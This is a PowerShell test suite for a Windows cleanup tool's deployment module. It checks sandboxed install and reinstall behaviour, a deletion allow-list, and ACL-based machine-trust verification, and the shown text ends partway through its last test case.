#Requires -Version 5.1
<#
.SYNOPSIS
    Behavioural tests for WindowsAutoCleanup.Deploy: the staged deployment copy, machine-trust
    verification, the scheduled-task ownership proof, the deletion allow-list and the two pure
    argument builders. Plus the standing proof that the removed ACL-hardening capability has not
    come back (ledger P0-3, P0-4, P0-6/U-2).

.DESCRIPTION
    %ProgramFiles% is redirected into a disposable sandbox for every case that touches a deployment
    root and restored in a finally block, so nothing is written outside the directory the case
    created. Register-ScheduledTask and Unregister-ScheduledTask are never called: the ownership
    proof is a pure function over a task object, so stub objects exercise it completely.
#>

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

. (Join-Path -Path $PSScriptRoot -ChildPath '_Harness.ps1')

$script:RepoRoot = Split-Path -Parent $PSScriptRoot
Import-Module -Name (Join-Path -Path $script:RepoRoot -ChildPath 'src\WindowsAutoCleanup.Core.psm1') `
    -Force -DisableNameChecking -ErrorAction Stop
Import-Module -Name (Join-Path -Path $script:RepoRoot -ChildPath 'src\WindowsAutoCleanup.Deploy.psm1') `
    -Force -DisableNameChecking -ErrorAction Stop

$script:WindowsPowerShell = Join-Path -Path $env:SystemRoot -ChildPath 'System32\WindowsPowerShell\v1.0\powershell.exe'

function Invoke-InDeploymentSandbox {
    <#
    .SYNOPSIS
        Runs a body with %ProgramFiles% pointed at a disposable sandbox, then restores it.
    .DESCRIPTION
        Get-WacDeploymentRoot reads the variable on every call, so redirecting it is what keeps a
        deployment test off the real machine. The body receives the sandbox path.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Prefix,
        [Parameter(Mandatory = $true)][scriptblock]$Body
    )

    $sandbox = New-TestSandbox -Prefix $Prefix
    $savedProgramFiles = $env:ProgramFiles
    try {
        $programFiles = Join-Path -Path $sandbox -ChildPath 'PF'
        [void][System.IO.Directory]::CreateDirectory($programFiles)
        $env:ProgramFiles = $programFiles
        & $Body $sandbox
    }
    finally {
        $env:ProgramFiles = $savedProgramFiles
        Remove-TestSandbox -Path $sandbox
    }
}

function New-TestCheckout {
    <#
    .SYNOPSIS
        A source checkout carrying every shape the deployment copy has to decide about.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [string]$RunContent = '# run'
    )

    foreach ($directory in @('src', '.git', '.ai', 'Logs', 'src\nested')) {
        [void][System.IO.Directory]::CreateDirectory((Join-Path -Path $Path -ChildPath $directory))
    }

    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'Run.ps1'), $RunContent)
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'LICENSE'), 'MIT')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'README.md'), 'readme')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'src\WindowsAutoCleanup.Core.psm1'), '# core')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'src\nested\deep.psm1'), '# deep')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'src\.ignoreme'), 'x')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath '.git\config'), 'x')
    [System.IO.File]::WriteAllText((Join-Path -Path $Path -ChildPath 'Logs\old.log'), 'x')

    return $Path
}

function Grant-TestEveryoneWrite {
    <#
    .SYNOPSIS
        Adds an explicit Allow(Everyone, Modify) ACE so a sandbox tree is untrusted on ANY runner.
    .DESCRIPTION
        A sandbox under TEMP is user-writable on a developer machine, but on an ELEVATED runner its
        owner is BUILTIN\Administrators and its only writers are administrators, which
        Test-WacPathIsMachineTrusted correctly accepts. Proving "fails closed on a user-writable
        tree" therefore needs a genuinely non-administrative writer, and Everyone (S-1-1-0) is on
        the module's never-admin list. Only ever called on a path the test itself created.
    #>
    param([Parameter(Mandatory = $true)][string]$Path)

    $acl = Get-Acl -LiteralPath $Path
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        (New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0')),
        [System.Security.AccessControl.FileSystemRights]::Modify,
        [System.Security.AccessControl.AccessControlType]::Allow)
    $acl.AddAccessRule($rule)
    Set-Acl -LiteralPath $Path -AclObject $acl
}

function New-StubAction {
    param(
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Execute,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Arguments,
        [AllowEmptyString()][string]$WorkingDirectory = ''
    )

    return [PSCustomObject]@{ Execute = $Execute; Arguments = $Arguments; WorkingDirectory = $WorkingDirectory }
}

function Get-TestAncestor {
    <#
    .SYNOPSIS
        Every ancestor directory of a path, nearest parent first, up to the volume root in rooted
        form. Test-local on purpose.
    .DESCRIPTION
        The module used to export its own copy of this walk beside its own copy of the ancestor ACL
        rule. Both were duplicates of what Core already owns (Test-WacStatePathIsTrusted), so both
        were deleted (ledger B2-3). The EXPECTED path set still has to be computed independently of
        the function under test, or a CheckedCount assertion becomes a tautology - hence this, which
        walks names only and makes no trust decision at all.
    #>
    param([Parameter(Mandatory = $true)][AllowEmptyString()][AllowNull()][string]$Path)

    $ancestors = New-Object 'System.Collections.Generic.List[string]'
    $current = Get-WacNormalizedPath -Path $Path
    if (-not $current) { return @($ancestors.ToArray()) }

    while ($true) {
        $parent = [System.IO.Path]::GetDirectoryName($current)
        if ([string]::IsNullOrEmpty($parent)) { break }

        $normalized = Get-WacNormalizedPath -Path $parent
        if (-not $normalized -or $normalized -ieq $current) { break }

        if ($normalized -match '^[A-Za-z]:$') { [void]$ancestors.Add($normalized + '\') }
        else { [void]$ancestors.Add($normalized) }

        $current = $normalized
    }

    return @($ancestors.ToArray())
}

function Get-ExpectedCheckedCount {
    <#
    .SYNOPSIS
        How many DISTINCT paths Test-WacDeploymentTrusted must have inspected for one deployment
        root: the root, its deployed directories and modules, and both ancestor chains.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Root,
        [AllowNull()][string]$TaskHost
    )

    $set = New-Object 'System.Collections.Generic.HashSet[string]' -ArgumentList ([System.StringComparer]::OrdinalIgnoreCase)
    [void]$set.Add((Get-WacNormalizedPath -Path $Root))

    foreach ($item in @(Get-WacDeploymentItem -Root $Root)) {
        if ($item.IsReparsePoint) { continue }
        if ($item.IsDirectory -or ($item.Path -match '(?i)\.psm?1$')) { [void]$set.Add($item.Path) }
    }
    foreach ($ancestor in @(Get-TestAncestor -Path $Root)) { [void]$set.Add($ancestor) }

    if ($TaskHost) {
        [void]$set.Add((Get-WacNormalizedPath -Path $TaskHost))
        foreach ($ancestor in @(Get-TestAncestor -Path $TaskHost)) { [void]$set.Add($ancestor) }
    }

    return $set.Count
}

function New-TestLegacyTask {
    <#
    .SYNOPSIS
        The task v1.0.0/v1.1.0 actually registered: root task path, the old description verbatim,
        and the exact interpolated action string that installer built.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Execute,
        [Parameter(Mandatory = $true)][string]$ScriptPath,
        [switch]$ResetWindowsUpdateBase,
        [string]$TaskPath = '\'
    )

    $arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}" -Scheduled' -f $ScriptPath
    if ($ResetWindowsUpdateBase) { $arguments = '{0} -ResetWindowsUpdateBase' -f $arguments }

    return (New-StubTask -TaskPath $TaskPath `
        -Description 'Runs WindowsAutoCleanup daily to silently remove explicitly allowed temporary files and cache locations from drive C:.' `
        -Action @(New-StubAction -Execute $Execute -Arguments $arguments -WorkingDirectory (Split-Path -Parent $ScriptPath)))
}

function New-StubTask {
    <#
    .SYNOPSIS
        A stand-in for a ScheduledTask object. Test-WacTaskIsOurs reads only these members, so a
        stub exercises the whole proof without registering anything with the live scheduler.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$TaskPath,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Description,
        [AllowEmptyCollection()][object[]]$Action = @()
    )

    return [PSCustomObject]@{
        TaskName = 'WindowsAutoCleanup'
        TaskPath = $TaskPath
        Description = $Description
        Actions = $Action
    }
}

# ---------------------------------------------------------------------------------------------
# What the deployment copy is allowed to carry (ledger P0-3)
# ---------------------------------------------------------------------------------------------

Test-Case 'Test-WacIsExcludedDeploymentName excludes dot-directories, Logs and blank names' {
    foreach ($name in @('.git', '.ai', '.claude', '.kiro', '.codex', '.ignoreme', '.Comments', 'Logs', 'logs', '', '   ')) {
        Assert-True (Test-WacIsExcludedDeploymentName -Name $name) ('[{0}] should be excluded' -f $name)
    }
}

Test-Case 'Test-WacIsExcludedDeploymentName keeps the files the task actually runs' {
    foreach ($name in @('src', 'Run.ps1', 'LICENSE', 'WindowsAutoCleanup.Core.psm1', 'LogsOfSomething')) {
        Assert-False (Test-WacIsExcludedDeploymentName -Name $name) ('[{0}] should be kept' -f $name)
    }
}

Test-Case 'Install-WacDeployment copies the runtime and leaves out dot-directories and Logs' {
    Invoke-InDeploymentSandbox -Prefix 'dep-copy' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)

        $deployment = Install-WacDeployment -SourceRoot $source

        Assert-Equal $root $deployment.DeploymentRoot
        Assert-Equal (Join-Path -Path $root -ChildPath 'Run.ps1') $deployment.RunScript
        Assert-True (Test-Path -LiteralPath $deployment.RunScript -PathType Leaf)
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'src\WindowsAutoCleanup.Core.psm1') -PathType Leaf)
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'src\nested\deep.psm1') -PathType Leaf)
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'LICENSE') -PathType Leaf)

        Assert-False (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'README.md')) 'README.md is not part of the runtime'
        Assert-False (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath '.git')) 'a dot-directory reached the deployment'
        Assert-False (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath '.ai')) 'a dot-directory reached the deployment'
        Assert-False (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'Logs')) 'Logs reached the deployment'
        Assert-False (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'src\.ignoreme')) 'a nested dot-file reached the deployment'

        # Five, not four: the deployment manifest is a file of the deployment too (ledger B2-3).
        Assert-Equal 5 $deployment.FileCount 'Run.ps1, LICENSE, two src modules and the manifest'
        Assert-True (Test-Path -LiteralPath (Get-WacDeploymentManifestPath -DeploymentRoot $root) -PathType Leaf) `
            'the deployment carries no ownership manifest, so nothing can prove it is ours'
    }
}

Test-Case 'Install-WacDeployment leaves no .staging or .previous slot behind' {
    Invoke-InDeploymentSandbox -Prefix 'dep-slots' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $slots = Get-WacDeploymentSlotPath

        [void](Install-WacDeployment -SourceRoot $source)

        Assert-False (Test-Path -LiteralPath $slots.Staging) 'the staging slot survived a successful install'
        Assert-False (Test-Path -LiteralPath $slots.Previous) 'the previous slot survived a successful install'
    }
}

Test-Case 'A reinstall replaces the tree instead of merging into it' {
    Invoke-InDeploymentSandbox -Prefix 'dep-stale' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $slots = Get-WacDeploymentSlotPath

        $first = Install-WacDeployment -SourceRoot $source
        $stale = Join-Path -Path $first.DeploymentRoot -ChildPath 'stale.txt'
        [System.IO.File]::WriteAllText($stale, 'stale')
        [System.IO.File]::WriteAllText((Join-Path -Path $source -ChildPath 'Run.ps1'), '# run v2')

        $second = Install-WacDeployment -SourceRoot $source

        Assert-False (Test-Path -LiteralPath $stale) 'a stale file survived the reinstall'
        Assert-Equal '# run v2' ([System.IO.File]::ReadAllText($second.RunScript))
        Assert-False (Test-Path -LiteralPath $slots.Staging) 'the staging slot survived the reinstall'
        Assert-False (Test-Path -LiteralPath $slots.Previous) 'the previous slot survived the reinstall'
    }
}

Test-Case 'Install-WacDeployment refuses a source that lives inside the deployment root' {
    Invoke-InDeploymentSandbox -Prefix 'dep-inside' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $inner = Join-Path -Path $deployment.DeploymentRoot -ChildPath 'src'

        Assert-Throws { Install-WacDeployment -SourceRoot $inner } 'overlaps the deployment root'
        Assert-True (Test-Path -LiteralPath $deployment.RunScript) 'a refused install damaged the live deployment'
    }
}

Test-Case 'Install-WacDeployment refuses a source that CONTAINS the deployment root' {
    $sandbox = New-TestSandbox -Prefix 'dep-outside'
    $savedProgramFiles = $env:ProgramFiles
    try {
        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $programFiles = Join-Path -Path $source -ChildPath 'PF'
        [void][System.IO.Directory]::CreateDirectory($programFiles)
        $env:ProgramFiles = $programFiles

        Assert-Throws { Install-WacDeployment -SourceRoot $source } 'overlaps the deployment root'
        Assert-False (Test-Path -LiteralPath (Join-Path -Path $programFiles -ChildPath 'WindowsAutoCleanup')) 'a refused install still created the root'
    }
    finally {
        $env:ProgramFiles = $savedProgramFiles
        Remove-TestSandbox -Path $sandbox
    }
}

Test-Case 'Install-WacDeployment refuses a source with no Run.ps1' {
    Invoke-InDeploymentSandbox -Prefix 'dep-norun' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        [System.IO.File]::Delete((Join-Path -Path $source -ChildPath 'Run.ps1'))
        $slots = Get-WacDeploymentSlotPath

        Assert-Throws { Install-WacDeployment -SourceRoot $source } 'Run\.ps1 was not found'
        Assert-False (Test-Path -LiteralPath $slots.Root) 'a refused install still created the deployment root'
    }
}

Test-Case 'A blocked swap leaves the live deployment complete and the next install clears the debris' {
    Invoke-InDeploymentSandbox -Prefix 'dep-swap' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $slots = Get-WacDeploymentSlotPath
        [void](Install-WacDeployment -SourceRoot $source)

        # Occupying the previous slot with a file makes the move-aside impossible, which is the one
        # deterministic way to interrupt the swap from outside the module.
        [System.IO.File]::WriteAllText($slots.Previous, 'blocker')
        [System.IO.File]::WriteAllText((Join-Path -Path $source -ChildPath 'Run.ps1'), '# run v2')

        Assert-Throws { Install-WacDeployment -SourceRoot $source }

        Assert-True (Test-Path -LiteralPath (Join-Path -Path $slots.Root -ChildPath 'Run.ps1') -PathType Leaf) 'the interrupted install lost the live Run.ps1'
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $slots.Root -ChildPath 'src\WindowsAutoCleanup.Core.psm1') -PathType Leaf) 'the interrupted install lost the live src tree'
        Assert-Equal '# run' ([System.IO.File]::ReadAllText((Join-Path -Path $slots.Root -ChildPath 'Run.ps1'))) 'the live deployment was half-replaced'

        [System.IO.File]::Delete($slots.Previous)
        $recovered = Install-WacDeployment -SourceRoot $source

        Assert-Equal '# run v2' ([System.IO.File]::ReadAllText($recovered.RunScript))
        Assert-False (Test-Path -LiteralPath $slots.Staging) 'the leftover staging slot was not cleared'
        Assert-False (Test-Path -LiteralPath $slots.Previous) 'the previous slot survived the recovery install'
    }
}

Test-Case 'Get-WacDeploymentSlotPath names exactly the three deletable paths' {
    Invoke-InDeploymentSandbox -Prefix 'dep-slotname' -Body {
        param($sandbox)

        $null = $sandbox
        $slots = Get-WacDeploymentSlotPath
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)

        Assert-Equal $root $slots.Root
        Assert-Equal ($root + '.staging') $slots.Staging
        Assert-Equal ($root + '.previous') $slots.Previous
    }
}

# ---------------------------------------------------------------------------------------------
# Deletion allow-list
# ---------------------------------------------------------------------------------------------

Test-Case 'Remove-WacDeployment refuses the source checkout and leaves it untouched' {
    Invoke-InDeploymentSandbox -Prefix 'dep-refuse' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')

        $result = Remove-WacDeployment -Path $source

        Assert-False $result.Removed 'the source checkout was accepted for deletion'
        Assert-True ([bool]$result.Reason) 'a refusal must carry a reason'
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $source -ChildPath 'Run.ps1')) 'the source checkout was deleted'
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $source -ChildPath 'src\WindowsAutoCleanup.Core.psm1'))
    }
}

Test-Case 'Remove-WacDeployment refuses any path outside the three deployment slots' {
    Invoke-InDeploymentSandbox -Prefix 'dep-outside-del' -Body {
        param($sandbox)

        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $candidates = @(
            (Join-Path -Path $env:ProgramFiles -ChildPath 'SomethingElse'),
            (Join-Path -Path $root -ChildPath 'src'),
            (Split-Path -Parent $root),
            ($root + '.backup'),
            (Join-Path -Path $sandbox -ChildPath 'anything')
        )

        foreach ($candidate in $candidates) {
            [void][System.IO.Directory]::CreateDirectory($candidate)
            $sentinel = Join-Path -Path $candidate -ChildPath 'sentinel.txt'
            [System.IO.File]::WriteAllText($sentinel, 'keep')

            $result = Remove-WacDeployment -Path $candidate

            Assert-False $result.Removed ('{0} was accepted for deletion' -f $candidate)
            Assert-True (Test-Path -LiteralPath $sentinel) ('{0} was deleted' -f $candidate)
        }
    }
}

Test-Case 'Remove-WacDeployment removes each of the three slots and is idempotent' {
    Invoke-InDeploymentSandbox -Prefix 'dep-del' -Body {
        param($sandbox)

        $null = $sandbox
        $slots = Get-WacDeploymentSlotPath

        foreach ($slot in @($slots.Root, $slots.Staging, $slots.Previous)) {
            [void][System.IO.Directory]::CreateDirectory((Join-Path -Path $slot -ChildPath 'src\nested'))
            [System.IO.File]::WriteAllText((Join-Path -Path $slot -ChildPath 'src\nested\deep.psm1'), 'x')

            $removal = Remove-WacDeployment -Path $slot
            Assert-True $removal.Removed ([string]$removal.Reason)
            Assert-False (Test-Path -LiteralPath $slot) ('{0} survived its own removal' -f $slot)

            $again = Remove-WacDeployment -Path $slot
            Assert-True $again.Removed 'removing an absent slot must succeed'
        }
    }
}

Test-Case 'Remove-WacDeployment clears a read-only file instead of giving up on it' {
    Invoke-InDeploymentSandbox -Prefix 'dep-ro' -Body {
        param($sandbox)

        $null = $sandbox
        $slots = Get-WacDeploymentSlotPath
        [void][System.IO.Directory]::CreateDirectory($slots.Root)
        $locked = Join-Path -Path $slots.Root -ChildPath 'readonly.psm1'
        [System.IO.File]::WriteAllText($locked, 'x')
        [System.IO.File]::SetAttributes($locked, [System.IO.FileAttributes]::ReadOnly)

        $removal = Remove-WacDeployment -Path $slots.Root

        Assert-True $removal.Removed ([string]$removal.Reason)
        Assert-False (Test-Path -LiteralPath $slots.Root)
    }
}

# ---------------------------------------------------------------------------------------------
# Machine-trust verification (ledger P0-6 / U-2). Verification only; nothing here mutates an ACL.
# ---------------------------------------------------------------------------------------------

Test-Case 'Test-WacDeploymentTrusted fails closed on a user-writable deployment' {
    Invoke-InDeploymentSandbox -Prefix 'dep-trust' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        Grant-TestEveryoneWrite -Path $deployment.DeploymentRoot

        $trust = Test-WacDeploymentTrusted -DeploymentRoot $deployment.DeploymentRoot

        Assert-False $trust.IsTrusted ('a world-writable deployment was reported trusted: ' + [string]$trust.Reason)
        Assert-True (@($trust.Untrusted).Count -gt 0) 'no untrusted path was reported'
        Assert-True ($trust.CheckedCount -gt 1) ('only {0} path was checked' -f $trust.CheckedCount)
        Assert-True ([bool]$trust.Reason) 'a failure must carry a reason'
        Assert-True ([bool](@($trust.Untrusted) | Where-Object { $_.Path -ieq $deployment.DeploymentRoot })) 'the root itself was not reported'
    }
}

Test-Case 'Test-WacDeploymentTrusted checks the deployed .ps1 and .psm1 files, not only directories' {
    Invoke-InDeploymentSandbox -Prefix 'dep-trustfiles' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $module = Join-Path -Path $deployment.DeploymentRoot -ChildPath 'src\WindowsAutoCleanup.Core.psm1'
        foreach ($path in @($deployment.RunScript, $module, (Join-Path -Path $deployment.DeploymentRoot -ChildPath 'LICENSE'))) {
            Grant-TestEveryoneWrite -Path $path
        }

        $trust = Test-WacDeploymentTrusted -DeploymentRoot $deployment.DeploymentRoot
        $paths = @(@($trust.Untrusted) | ForEach-Object { $_.Path })

        Assert-True ($paths -contains $deployment.RunScript) 'Run.ps1 was never checked'
        Assert-True ($paths -contains $module) 'a deployed module was never checked'
        Assert-False ($paths -contains (Join-Path -Path $deployment.DeploymentRoot -ChildPath 'LICENSE')) 'a non-executable file was checked'
    }
}

Test-Case 'Test-WacDeploymentTrusted reports a missing root as untrusted' {
    Invoke-InDeploymentSandbox -Prefix 'dep-trustgone' -Body {
        param($sandbox)

        $trust = Test-WacDeploymentTrusted -DeploymentRoot (Join-Path -Path $sandbox -ChildPath 'does-not-exist')

        Assert-False $trust.IsTrusted
        Assert-Equal 0 $trust.CheckedCount
        Assert-True ([bool]$trust.Reason)
    }
}

Test-Case 'Test-WacDeploymentTrusted reports a reparse point inside the deployment' {
    Invoke-InDeploymentSandbox -Prefix 'dep-trustlink' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $target = Join-Path -Path $sandbox -ChildPath 'elsewhere'
        [void][System.IO.Directory]::CreateDirectory($target)
        $link = Join-Path -Path $deployment.DeploymentRoot -ChildPath 'link'

        New-Item -ItemType Junction -Path $link -Target $target -ErrorAction Stop | Out-Null
        try {
            $trust = Test-WacDeploymentTrusted -DeploymentRoot $deployment.DeploymentRoot
            $reported = @(@($trust.Untrusted) | Where-Object { $_.Path -ieq $link })

            Assert-False $trust.IsTrusted
            Assert-Equal 1 $reported.Count 'the junction was not reported'
            Assert-True ($reported[0].Reason -match 'reparse point') ([string]$reported[0].Reason)
        }
        finally {
            try { [System.IO.Directory]::Delete($link, $false) } catch { $null = $_ }
        }
    }
}

Test-Case 'Test-WacDeploymentTrusted passes on a real machine-owned directory' {
    $candidates = @(
        (Join-Path -Path $env:SystemRoot -ChildPath 'System32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Host'),
        (Join-Path -Path $env:SystemRoot -ChildPath 'System32\drivers\etc')
    )

    $machineOwned = $null
    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate -PathType Container) { $machineOwned = $candidate; break }
    }

    Assert-True ([bool]$machineOwned) 'no machine-owned probe directory exists on this machine'

    # Read-only: the check never writes to, or re-permissions, the directory it inspects.
    $trust = Test-WacDeploymentTrusted -DeploymentRoot $machineOwned

    Assert-True $trust.IsTrusted ([string]$trust.Reason)
    Assert-Equal 0 @($trust.Untrusted).Count
    Assert-True ($trust.CheckedCount -ge 1)
}

# ---------------------------------------------------------------------------------------------
# Ancestor trust (ledger R-22): write access to a PARENT replaces everything inside it
# ---------------------------------------------------------------------------------------------

Test-Case 'The ancestor walk is Core''s, not a second copy living in Deploy' {
    # Ledger B2-3. Deploy carried its own Get-WacPathAncestor and its own ancestor ACL rule, which
    # were duplicates of the decision Core already owns. Two copies of a security rule is one copy
    # that gets fixed and one that does not, so the copies were deleted. This pins that: the module
    # must no longer export them, and the walk it does use has to be Core's.
    $exported = @((Get-Module WindowsAutoCleanup.Deploy).ExportedFunctions.Keys)
    foreach ($gone in @('Get-WacPathAncestor', 'Test-WacAncestorIsMachineTrusted', 'Test-WacAncestorDescriptorIsTrusted')) {
        Assert-False ($exported -contains $gone) ('{0} came back as a second copy of Core''s ancestor rule' -f $gone)
    }

    $source = [System.IO.File]::ReadAllText((Join-Path -Path $script:RepoRoot -ChildPath 'src\WindowsAutoCleanup.Deploy.psm1'))
    $tokens = $null
    $errors = $null
    [void][System.Management.Automation.Language.Parser]::ParseInput($source, [ref]$tokens, [ref]$errors)
    $code = @(@($tokens) | Where-Object { $_.Kind -ne 'Comment' } | ForEach-Object { $_.Text })

    Assert-True ($code -contains 'Test-WacStatePathIsTrusted') 'Deploy no longer calls Core''s ancestor walk at all'
    Assert-Equal 0 @($code | Where-Object { $_ -eq 'GetAccessRules' }).Count `
        'Deploy is decoding access rules again instead of delegating the decision to Core'
}

Test-Case 'Test-WacDeploymentTrusted names a user-writable PARENT of the deployment root' {
    Invoke-InDeploymentSandbox -Prefix 'dep-parent' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $parent = Get-WacNormalizedPath -Path (Split-Path -Parent $deployment.DeploymentRoot)

        # Everyone:Modify carries DELETE and DELETE_CHILD, which is precisely the grant that lets a
        # standard user rename the whole deployment aside and drop a different one in its place.
        # The ACE is not inheritable, so the deployment root's own descriptor is left alone and the
        # only new failure can come from the ancestor walk.
        Grant-TestEveryoneWrite -Path $parent

        $trust = Test-WacDeploymentTrusted -DeploymentRoot $deployment.DeploymentRoot
        $reported = @(@($trust.Untrusted) | ForEach-Object { $_.Path })
        $named = @($reported | Where-Object { $_ -ieq $parent })
        $expected = Get-ExpectedCheckedCount -Root $deployment.DeploymentRoot -TaskHost (Get-WacCanonicalPowerShellHost)

        Assert-False $trust.IsTrusted ('a deployment under a user-writable parent was trusted: ' + [string]$trust.Reason)
        Assert-Equal 1 $named.Count ('the parent {0} was never checked; reported: {1}' -f $parent, ($reported -join '; '))
        Assert-Equal $expected $trust.CheckedCount `
            ('the ancestor chains were not all walked: {0} checked, {1} expected' -f $trust.CheckedCount, $expected)
    }
}

Test-Case 'Test-WacDeploymentTrusted trusts the real machine chain up to the volume root' {
    $probe = Get-WacDeploymentRoot
    if (-not (Test-Path -LiteralPath $probe -PathType Container)) {
        $probe = Join-Path -Path $env:SystemRoot -ChildPath 'System32\drivers\etc'
    }
    Assert-True (Test-Path -LiteralPath $probe -PathType Container) ('no real machine-owned probe exists: ' + $probe)

    $taskHost = Get-WacCanonicalPowerShellHost
    Assert-True ([bool]$taskHost) 'no machine-trusted PowerShell host exists on this machine'

    # CheckedCount is asserted EXACTLY, not as a lower bound. A lower bound is already satisfied
    # by the deployed paths alone, so it stays green when the ancestor walk is removed and
    # therefore proves nothing. The expectation covers BOTH chains: the deployment root and the
    # PowerShell host the task will run.
    $ancestors = @()
    foreach ($chain in @($probe, $taskHost)) {
        foreach ($ancestor in @(Get-TestAncestor -Path $chain)) {
            if ($ancestors -notcontains $ancestor) { $ancestors += $ancestor }
        }
    }

    # Read-only: the check never writes to, or re-permissions, anything it inspects.
    $trust = Test-WacDeploymentTrusted -DeploymentRoot $probe
    $reported = @(@($trust.Untrusted) | ForEach-Object { $_.Path })

    Assert-True $trust.IsTrusted ([string]$trust.Reason + ' :: ' + ($reported -join '; '))
    Assert-Equal 0 $reported.Count ($reported -join '; ')
    Assert-True ($ancestors -contains 'C:\') ('the walk did not reach the volume root: ' + ($ancestors -join '; '))
    Assert-Equal (Get-ExpectedCheckedCount -Root $probe -TaskHost $taskHost) $trust.CheckedCount `
        ('the host and root ancestors were not all checked; ancestors: ' + ($ancestors -join '; '))
}

Test-Case 'Test-WacDeploymentTrusted keeps its findings when no canonical PowerShell host exists' {
    Invoke-InDeploymentSandbox -Prefix 'dep-nohost' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $root = Get-WacNormalizedPath -Path $deployment.DeploymentRoot
        Grant-TestEveryoneWrite -Path $root

        $taskHost = Get-WacCanonicalPowerShellHost
        Assert-True ([bool]$taskHost) 'no machine-trusted PowerShell host exists on this machine'

        $expectedWithHost = Get-ExpectedCheckedCount -Root $root -TaskHost $taskHost
        $expectedWithoutHost = Get-ExpectedCheckedCount -Root $root -TaskHost $null

        # The comparison the early return used to lose. Both readings are taken against the same
        # tree, so the ONLY difference between them may be the host chain.
        $withHost = Test-WacDeploymentTrusted -DeploymentRoot $root

        # Get-WacCanonicalPowerShellHost reads %ProgramFiles% and %SystemRoot% and nothing else;
        # %ProgramFiles% already points into this sandbox, so an empty %SystemRoot% leaves it with
        # no candidate at all. Restored in the finally, because the whole suite shares this process.
        $savedSystemRoot = $env:SystemRoot
        try {
            $empty = Join-Path -Path $sandbox -ChildPath 'no-windows'
            [void][System.IO.Directory]::CreateDirectory($empty)
            $env:SystemRoot = $empty
            Assert-Equal $null (Get-WacCanonicalPowerShellHost) 'a host was still reachable, so this case proves nothing'
            $withoutHost = Test-WacDeploymentTrusted -DeploymentRoot $root
        }
        finally {
            $env:SystemRoot = $savedSystemRoot
        }

        $namedWith = @(@($withHost.Untrusted) | Where-Object { [string]$_.Path -ieq $root })
        $namedWithout = @(@($withoutHost.Untrusted) | Where-Object { [string]$_.Path -ieq $root })
        $hostFindings = @(@($withoutHost.Untrusted) | Where-Object { [string]$_.Reason -like '*No machine-trusted PowerShell host*' })

        Assert-Equal $false $withHost.IsTrusted ([string]$withHost.Reason)
        Assert-Equal $false $withoutHost.IsTrusted ([string]$withoutHost.Reason)

        # The user-writable deployment root is the finding the installer has to print. An early
        # return discards it and reports UntrustedCount=0, so the installer's loop over
        # $trust.Untrusted names nothing and the operator is told only that something is wrong.
        Assert-Equal 1 $namedWith.Count ('the writable root was not reported at all: ' + ($namedWith -join '; '))
        Assert-Equal 1 $namedWithout.Count 'the writable root was dropped once no host was available'
        Assert-Equal 1 $hostFindings.Count 'the missing host was not reported as a finding of its own'
